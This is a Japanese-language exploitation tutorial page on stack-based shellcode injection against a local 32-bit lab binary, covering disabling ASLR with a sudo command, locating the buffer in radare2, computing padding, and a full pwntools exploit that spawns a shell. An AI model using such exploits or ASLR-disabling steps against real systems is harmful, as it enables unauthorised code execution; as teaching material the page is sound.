---
description: Running your own code
---

# Shellcode

実際のエクスプロイトでは、都合よく `win()` 関数が転がっていることはあまりありません。シェルコード(shellcode)は**自分の**命令を実行する方法で、システム上で任意のコマンドを実行できるようにします。

**シェルコード**は基本的に**アセンブリ命令**ですが、それをバイナリに入力します。入力したら、リターンポインタを上書きしてコード実行を乗っ取り、自分の命令を指すようにします。

{% hint style="danger" %}
私は信頼してもらって大丈夫ですが、何をするものか分からないシェルコードは、_絶対に_実行してはいけません。Pwntools は安全で、必要なシェルコードのほとんどが揃っています。
{% endhint %}

シェルコードが成功する理由は、[フォン・ノイマン型アーキテクチャ](https://en.wikipedia.org/wiki/Von_Neumann_architecture)(現在のほとんどのコンピュータが採用しているアーキテクチャ)が、**データ**と**命令**を区別しないことにあります。どこで何を実行するように指示しても、それを実行しようとします。したがって、私たちの入力はデータですが、コンピュータは_それを知りません_。これを利用できるのです。

{% file src="../../.gitbook/assets/shellcode.zip" caption="Shellcode" %}

### ASLR を無効にする

ASLR はセキュリティ技術です。シェルコードを防ぐために特別に設計されたものではありませんが、メモリの特定の部分をランダム化します(詳しくは後で扱います)。このランダム化のせいで、これから行うようなシェルコードのエクスプロイトは、確実性が下がることがあります。そこで、[この方法](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)で一時的に無効にします。

```text
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

{% hint style="danger" %}
繰り返しますが、何をするのか分からないコマンドは実行しないでください
{% endhint %}

### メモリ上のバッファを見つける

`radare2` で `vuln()` をデバッグして、バッファがメモリ上のどこから始まるかを調べましょう。リターンポインタをここに向けたいのです。

```text
$ r2 -d -A vuln

[0xf7fd40b0]> s sym.unsafe ; pdf
[...]
; var int32_t var_134h @ ebp-0x134
[...]
```

表示されたこの値は**ローカル変数**です。サイズからして、バッファである可能性がかなり高そうです。`gets()` の直後にブレークポイントを置いて、正確なアドレスを調べましょう。

```text
[0x08049172]> dc
Overflow me
<<Found me>>                    <== This was my input
hit breakpoint at: 80491a8
[0x080491a8]> px @ ebp - 0x134
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  <<Found me>>....

[...]
```

`0xffffcfd4` にあるようです。バイナリを何度か実行しても、位置は変わらないはずです(変わる場合は、ASLR が無効になっているか確認してください)。

### パディングを見つける

次に、リターンポインタまでのパディングを計算します。前の記事で説明した De Bruijn 配列を使います。

```text
$ ragg2 -P 400 -r
<copy this>

$ r2 -d -A vuln
[0xf7fd40b0]> dc
Overflow me
<<paste here>>
[0x73424172]> wopO `dr eip`
312
```

パディングは 312 バイトです。

### すべてをまとめる

シェルコードを正しく動かすために、`context.binary` を対象のバイナリに設定します。これでアーキテクチャ、OS、ビット数などが取得され、pwntools が動作するシェルコードを提供してくれます。

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()
```

{% hint style="info" %}
`context.binary` を設定すると、そのプロセスを使うものとみなされるので、`process()` だけで済みます
{% endhint %}

あとは pwntools の素晴らしいシェルコード機能を使えば、_驚くほど_簡単です。

```python
payload = asm(shellcraft.sh())          # シェルコード
payload = payload.ljust(312, b'A')      # パディング
payload += p32(0xffffcfb4)              # シェルコードのアドレス
```

そう、これだけです。送信して、シェルとやり取りできる `p.interactive()` を使いましょう。

```python
log.info(p.clean())

p.sendline(payload)

p.interactive()
```

{% hint style="warning" %}
`EOFError` が出る場合は、シェルコードを出力して、メモリ上で探してみてください。スタックアドレスが間違っている可能性があります
{% endhint %}

```text
$ python3 exploit.py
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process 'vuln': pid 3606
[*] Overflow me
[*] Switching to interactive mode
$ whoami
ironstone
$ ls
exploit.py  source.c  vuln
```

動きました。素晴らしいです。

### 最終的なエクスプロイト

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # シェルコード
payload = payload.ljust(312, b'A')      # パディング
payload += p32(0xffffcfb4)              # シェルコードのアドレス

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

### まとめ

* 入力を求められたときに、アセンブリ命令の並びであるシェルコードを注入しました
* スタック上の、保存されたリターンポインタを上書きして、シェルコードを指すように変更し、コード実行を乗っ取りました
* リターンポインタが EIP に pop されると、シェルコードを指すようになりました
* その結果、プログラムが私たちの命令を実行し、(今回は)任意のコマンドを実行できるシェルが得られました
